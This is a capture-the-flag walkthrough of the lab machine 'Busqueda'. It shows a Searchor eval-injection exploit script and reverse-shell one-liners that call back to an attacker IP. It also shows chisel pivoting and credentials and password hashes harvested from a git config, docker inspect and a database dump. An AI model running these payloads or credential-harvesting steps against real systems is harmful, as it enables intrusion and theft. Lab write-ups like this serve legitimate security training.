![busqueda.png](busqueda.png)

# Busqueda

## Enum
```bash
nmap -sC -sV 10.10.11.208 -oN scans/nmap.initial
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 09:30 IST
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
```

```bash
dirsearch -r -u http://searcher.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/searcher.htb/_23-05-01_09-36-48.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-05-01_09-36-48.log

Target: http://searcher.htb/

[09:36:48] Starting:
[09:37:24] 405 -  153B  - /search
[09:37:24] 403 -  277B  - /server-status/     (Added to queue)
[09:37:24] 403 -  277B  - /server-status
[09:37:31] Starting: server-status/
[09:37:31] 404 -  207B  - /server-status/%2e%2e//google.com

Task Completed
```

```bash
curl -I -X POST http://searcher.htb/search
HTTP/1.1 200 OK
Date: Mon, 01 May 2023 08:49:00 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 13534
Vary: Accept-Encoding
```

```
Powered by Flask and Searchor 2.4.0
```

[https://github.com/ArjunSharda/Searchor](https://github.com/ArjunSharda/Searchor)  
[PR](https://github.com/ArjunSharda/Searchor/pull/130/files/29d5b1f28d29d6a282a5e860d456fab2df24a16b)  


```bash
git clone https://github.com/ArjunSharda/Searchor.git
```

Building the docker container to start experimenting with the library
```python
>>> from searchor import Engine
>>> engine="Youtube"
>>> query="hi"
>>> f"Engine.{engine}.search('{query}')"
"Engine.Youtube.search('hi')"
>>> eval(f"Engine.{engine}.search('{query}')")
'https://www.youtube.com/results?search_query=hi'
>>> query="'),dir(),print('"
>>> f"Engine.{engine}.search('{query}')"
"Engine.Youtube.search(''),dir(),print('')"
>>> eval(f"Engine.{engine}.search('{query}')")

('https://www.youtube.com/results?search_query=', ['Engine', '__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'engine', 'query'], None)
```

The older version didn't have the docker container, but no big deal, lets just make a virtual environment, and install the tool
```bash
git checkout b5e67ec
python3 -m venv venv
source venv/bin/activate
pip install .
```

We know the eval is beeing called whan using the cli like this:
```bash
searchor search Youtube 'hamsters'
https://www.youtube.com/results?search_query=hamsters
```

Playing around to get command execution
```python
>>> engine="Youtube"
>>> open=False
>>> copy=False
>>> query="'),dir(),Engine.Youtube.search('"
>>> f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
"Engine.Youtube.search(''),dir(),Engine.Youtube.search('', copy_url=False, open_web=False)"
>>> eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
('https://www.youtube.com/results?search_query=', ['Engine', '__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'copy', 'engine', 'open', 'open_web', 'query'], 'https://www.youtube.com/results?search_query=')
```

So if we do that from the cli that should work too
```bash
searchor search Youtube "'),dir(),Engine.Youtube.search('"
('https://www.youtube.com/results?search_query=', ['copy', 'engine', 'open', 'query'], 'https://www.youtube.com/results?search_query=')
```

And it does, so assuming that the webapp calls the that same function in the main somehow, it should give us RCE this way
```bash
curl -X POST \
  http://searcher.htb/search \
  -d 'engine=Youtube&query=%27%29%2Cdir%28%29%2CEngine.Youtube.search%28%27'

('https://www.youtube.com/results?search_query=', ['copy', 'engine', 'open', 'query'], 'https://www.youtube.com/results?search_query=')
```

eval, is a bit inconvenient, as we can't really separate our statements with semicolons,  
So I ended up finding a stack overflow post suggesting to call os.system to do a netcat reverse shell
And the nc shell itself didn't work, but I could start playing with that:
```bash
'),__import__('os').system('nc 10.10.14.39 4242 -e /bin/sh'),Engine.Youtube.search('
'),__import__('os').system('ping -c3 10.10.14.39'),Engine.Youtube.search('
'),__import__('os').system('cat /etc/passwd'),Engine.Youtube.search('
'),__import__('os').system('pwd'),Engine.Youtube.search('
```

Let's make a quick exploit script
```python
import sys
import requests
from urllib.parse import quote, urlencode, quote_plus

cmd = sys.argv[1]
url = "http://searcher.htb/search"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*"
}
payload = f"'),__import__('os').system('{cmd}'),Engine.Youtube.search('"
encoded = quote(payload, safe="")
data = f"engine=Youtube&query={encoded}"

res = requests.post(url, headers=headers, data=data)
print(res.status_code)
print(res.text)
```

```bash
python3 tool.py "id"
200
uid=1000(svc) gid=1000(svc) groups=1000(svc)
('https://www.youtube.com/results?search_query=', 0, 'https://www.youtube.com/results?search_query=')

python3 tool.py "pwd"
200
/var/www/app
('https://www.youtube.com/results?search_query=', 0, 'https://www.youtube.com/results?search_query=')

python3 tool.py "cat /etc/passwd"|grep sh$
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash

python3 tool.py "cat /home/svc/.ssh/id_rsa"
200
('https://www.youtube.com/results?search_query=', 256, 'https://www.youtube.com/results?search_query=')
```

After throwing a few revshels form revshells.com, finally got one to stick
```bash
python3 tool.py "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.39 4242 >/tmp/f"
```

Getting the user flag, and dropping an authorized keys in ~svc to get a propper shell
```
$ cd
$ pwd
/home/svc
$ wc -c user.txt
```

Just checking the app to see if our assumption was correct
```bash
svc@busqueda:/var/www/app$ vim app.py
```

And yea, it is a super simple flask app, that calls the cli of searchor through subprocess, triggering the vulnerable code in main
```python
from flask import Flask, render_template, request, redirect
from searchor import Engine
import subprocess


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', options=Engine.__members__, error='')

@app.route('/search', methods=['POST'])
def search():
    try:
        engine = request.form.get('engine')
        query = request.form.get('query')
        auto_redirect = request.form.get('auto_redirect')

        if engine in Engine.__members__.keys():
            arg_list = ['searchor', 'search', engine, query]
            r = subprocess.run(arg_list, capture_output=True)
            url = r.stdout.strip().decode()
            if auto_redirect is not None:
                return redirect(url, code=302)
            else:
                return url

        else:
            return render_template('index.html', options=Engine.__members__, error="Invalid engine!")

    except Exception as e:
        print(e)
        return render_template('index.html', options=Engine.__members__, error="Something went wrong!")

if __name__ == '__main__':
    app.run(debug=False)
```


## Privesc

```
svc@busqueda:~$ netstat -tulpen
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.1:43439         0.0.0.0:*               LISTEN      0          35379      -
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1000       733356     245982/python3
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      0          38537      -
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      0          38453      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          37321      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1000       38681      1657/python3
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        32241      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          36235      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          35309      -
tcp6       0      0 :::80                   :::*                    LISTEN      0          36260      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        32240      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          32286      -
```

```
svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:43439
HTTP/1.1 404 Not Found
Date: Mon, 01 May 2023 11:28:17 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8

svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:5000
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.6
Date: Mon, 01 May 2023 11:28:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13519
Connection: close

svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:3000
HTTP/1.1 200 OK
Set-Cookie: i_like_gitea=1785a26bfd1cd4f4; Path=/; HttpOnly; SameSite=Lax
Date: Mon, 01 May 2023 11:28:27 GMT
```

So there's a gitea instance, probably not pointing to the flask app though
```bash
svc@busqueda:/var/www/app$ git config --global --add safe.directory /var/www/app
svc@busqueda:/var/www/app$ git log --oneline
5ede9ed (HEAD -> main, origin/main) Initial commit
```

Lets setup some socks5 proxy with chisel
```bash
local # ./chisel-arm server -p 4242 --socks5 --reverse
remote # ./chisel-amd client 10.10.14.39:4242 R:1080:socks
```
```bash
local # curl -x socks5://localhost:1080 -I http://127.0.0.1:3000
HTTP/1.1 200 OK
Set-Cookie: i_like_gitea=f5aafbf458b1e8de; Path=/; HttpOnly; SameSite=Lax
Date: Mon, 01 May 2023 11:37:38 GMT
```
Making a quick foxyproxy config, and we're all set
![foxy.png](foxy.png)  
![root.png](root.png)  

In ~svc
```
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

Scanning through the proxy
```bash
proxychains -q nmap -sC -sV 127.0.0.1 -oN scans/nmap.initial
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 13:13 IST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 8.70% done; ETC: 13:14 (0:01:24 remaining)
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 17.70% done; ETC: 13:14 (0:01:14 remaining)
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 18.60% done; ETC: 13:14 (0:01:10 remaining)
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 43.00% done; ETC: 13:14 (0:00:50 remaining)
Stats: 0:02:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 13:16 (0:00:35 remaining)
Nmap scan report for pop.localhost (127.0.0.1)
Host is up (0.089s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey:
|   256 3a3815229d615cd6253f821303e21c2a (ECDSA)
|_  256 35f562c5ab52e6869dbf8d5dd4c33c22 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=cc08a6d5781742d8; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=gUad1fDfD2DAfqJy5dLrWulPXTo6MTY4Mjk0MzI4NzQ0MTIwNTE5Mw; Path=/; Expires=Tue, 02 May 2023 12:14:47 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 01 May 2023 12:14:47 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjo
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=353b1c460c5078a7; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=9oa6C-OkBKlRSF2WKX7sw4G17As6MTY4Mjk0MzMwMDI4OTU2NDg2Ng; Path=/; Expires=Tue, 02 May 2023 12:15:00 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 01 May 2023 12:15:00 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.31
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 8.0.31
|   Thread ID: 35
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, ODBCClient, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag, InteractiveClient, FoundRows, IgnoreSigpipes, Support41Auth, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, LongPassword, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: D9Fe\x14\x0EW\x19\x07\x132h   *];\x1BK\x1F^
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
| Not valid before: 2023-01-04T18:43:43
|_Not valid after:  2033-01-01T18:43:43
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.6
|     Date: Mon, 01 May 2023 12:14:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13519
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Searcher</title>
|     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/css/bootstrap.min.css">
|     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
|     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
|     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
|     <style>
|     @import url("https://fonts.googleapis.com/css2?family=Poppins:weight@100;200;300;400;500;600;700;800&display=swap");Searcher body{
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=5/1%Time=644FAD36%P=aarch64-unknown-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Con
SF:trol:\x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20ch
SF:arset=UTF-8\r\nSet-Cookie:\x20i_like_gitea=cc08a6d5781742d8;\x20Path=/;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=gUad1fDfD2DAfqJy5
SF:dLrWulPXTo6MTY4Mjk0MzI4NzQ0MTIwNTE5Mw;\x20Path=/;\x20Expires=Tue,\x2002
SF:\x20May\x202023\x2012:14:47\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet
SF:-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2001\x20
SF:May\x202023\x2012:14:47\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en-US\"\x20class=\"theme-auto\">\n<head>\n\t<meta\x20charset=\"utf-8
SF:\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20i
SF:nitial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20
SF:tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/jso
SF:n;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X2
SF:5hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0c
SF:DovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjo")%r(Help,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTP
SF:Options,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Cont
SF:rol:\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=353b1c
SF:460c5078a7;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_
SF:csrf=9oa6C-OkBKlRSF2WKX7sw4G17As6MTY4Mjk0MzMwMDI4OTU2NDg2Ng;\x20Path=/;
SF:\x20Expires=Tue,\x2002\x20May\x202023\x2012:15:00\x20GMT;\x20HttpOnly;\
SF:x20SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age
SF:=0;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nD
SF:ate:\x20Mon,\x2001\x20May\x202023\x2012:15:00\x20GMT\r\nContent-Length:
SF:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=5/1%Time=644FAD37%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,357F,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\
SF:.2\x20Python/3\.10\.6\r\nDate:\x20Mon,\x2001\x20May\x202023\x2012:14:47
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x2013519\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x
SF:20\x20\x20\x20<title>Searcher</title>\n\x20\x20\x20\x20<link\x20rel=\"s
SF:tylesheet\"\x20href=\"https://cdn\.jsdelivr\.net/npm/bootstrap@5\.0\.0-
SF:alpha1/dist/css/bootstrap\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"
SF:stylesheet\"\x20href=\"https://cdnjs\.cloudflare\.com/ajax/libs/font-aw
SF:esome/4\.7\.0/css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20r
SF:el=\"stylesheet\"\x20href=\"https://cdnjs\.cloudflare\.com/ajax/libs/tw
SF:itter-bootstrap/4\.1\.3/css/bootstrap\.min\.css\">\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"https://cdnjs\.cloudflare\.com/ajax/
SF:libs/ionicons/2\.0\.1/css/ionicons\.min\.css\">\n\x20\x20\x20\x20<style
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20@import\x20url\(\"https://fonts\.goo
SF:gleapis\.com/css2\?family=Poppins:weight@100;200;300;400;500;600;700;80
SF:0&display=swap\"\);Searcher\x20\x20\x20\x20\x20\x20\x20\x20body{\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20b")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20
SF:PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x2
SF:0\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"
SF:Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</he
SF:ad>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\
SF:x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20
SF:400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\
SF:x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p
SF:>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x
SF:20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\
SF:x20</body>\n</html>\n");
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 287.32 seconds
```

From pspy64
```
2023/05/01 12:23:07 CMD: UID=1000 PID=3343   | mysql -h 127.0.0.1 -u gitea -P 3306 -p gitea
2023/05/01 12:23:10 CMD: UID=1000 PID=3344   | ssh gitea@127.0.0.1 -p 222
2023/05/01 12:23:23 CMD: UID=1000 PID=3347   | ssh gitea@127.0.0.1 222
```

The password doesn't seem to work though
```
proxychains -q mysql -h 127.0.0.1 -u gitea -P 3306 -p gitea                                                                            1 ⨯
Enter password:
ERROR 1045 (28000): Access denied for user 'gitea'@'172.19.0.1' (using password: YES)
```

```bash
svc@busqueda:/etc/ssh$ grep -v '^#\|^$' sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp  /usr/lib/openssh/sftp-server
PasswordAuthentication yes
```

Found this:
```bash
grep -ri cody ./*
./app/.git/config:      url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```
```bash
sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 11 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 11 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db|jq .
```
```json
{
  "Hostname": "f84a6b33fb5a",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "3306/tcp": {},
    "33060/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
  "Cmd": [
    "mysqld"
  ],
  "Image": "mysql:8",
  "Volumes": {
    "/var/lib/mysql": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "docker-entrypoint.sh"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "db",
    "com.docker.compose.version": "1.29.2"
  }
}
```

The passwords we have so far:
```
cody:jh1usoih2bkjaspwe92
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
```

The `non root` password gives us access to the db
```bash
svc@busqueda:~$ mysql -h 127.0.0.1 -u gitea -P 3306 -D gitea -p
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 25
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
```sql
mysql> pager less -SFX
PAGER set to 'less -SFX'

mysql> select * from user;
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------>
| id | lower_name    | name          | full_name | email                            | keep_email_private | email_notifications_preference | passwd                             >
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------>
|  1 | administrator | administrator |           | administrator@gitea.searcher.htb |                  0 | enabled                        | ba598d99c2202491d36ecf13d5c28b74e27>
|  2 | cody          | cody          |           | cody@gitea.searcher.htb          |                  0 | enabled                        | b1f895e8efe070e184e5539bc5d93b362b2>

mysql> select name,passwd,salt from user;
+---------------+------------------------------------------------------------------------------------------------------+----------------------------------+
| name          | passwd                                                                                               | salt                             |
+---------------+------------------------------------------------------------------------------------------------------+----------------------------------+
| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | a378d3f64143b284f104c926b8b49dfb |
| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | d1db0a75a18e50de754be2aafcad5533 |
+---------------+------------------------------------------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```

Also, yoink, but sifting through the dump, I don't think there's really anything relevant, else than the salted password hashes?
```bash
proxychains -q mysqldump -h 127.0.0.1 -u gitea -P 3306 --all-databases -p|tee dump.sql
```

They are 50 bytes, pbkdf2 with 16bytes salts
```bash
printf 'ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2'|wc -c
100
printf 'a378d3f64143b284f104c926b8b49dfb'|wc -c
32
```

Not sure how I would go about cracking that, but it doesn't matter because the passwords we found earlier works on the gitea webapp.  
The administrator user corresponds to the `mysql non root` password we found earlyer.  
And cody corresponds to cody's password.  
Happy days, now as the administrator, we can see all source code of the scripts folder  

Heck, we migh even be able to push a code change, let's see if I can get a key in there:
![key.png](key.png)  

Looks like I can
![yes.png](yes.png)  

Or just using the password with the http endpoint will work too
```bash
proxychains git clone http://127.0.0.1:3000/administrator/scripts.git
